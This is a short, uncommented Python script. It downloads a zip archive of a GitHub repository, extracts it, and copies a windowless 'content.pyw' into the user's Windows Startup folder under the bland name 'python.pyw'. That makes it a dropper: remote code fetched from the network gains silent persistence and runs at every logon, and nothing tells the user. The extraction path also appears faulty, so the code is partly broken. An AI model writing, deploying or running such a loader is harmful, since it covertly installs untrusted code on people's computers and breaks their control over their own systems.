import os, sys, tempfile, shutil, zipfile, random
from urllib import request, response, parse, error

if __name__ == "__main__":
    user = "redphazon91"
    repo = "winpeg"
    url = f"https://github.com/{user}/{repo}/archive/refs/heads/main.zip"
    path = f"{repo}.zip"
    with tempfile.TemporaryDirectory() as tmpdir:
        with request.urlopen(url) as response:
            with open(os.path.join(tmpdir, path), "wb") as file:
                shutil.copyfileobj(response, file)
        contentdir = os.path.join(tmpdir, os.path.splitext(path)[0])
        with zipfile.ZipFile(os.path.join(tmpdir, path), "r") as zip:
            zip.extractall(contentdir)
        installfilename_bs = f"python.pyw"
        installdir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        shutil.copyfile(os.path.join(contentdir, "content.pyw"), os.path.join(installdir, installfilename_bs))
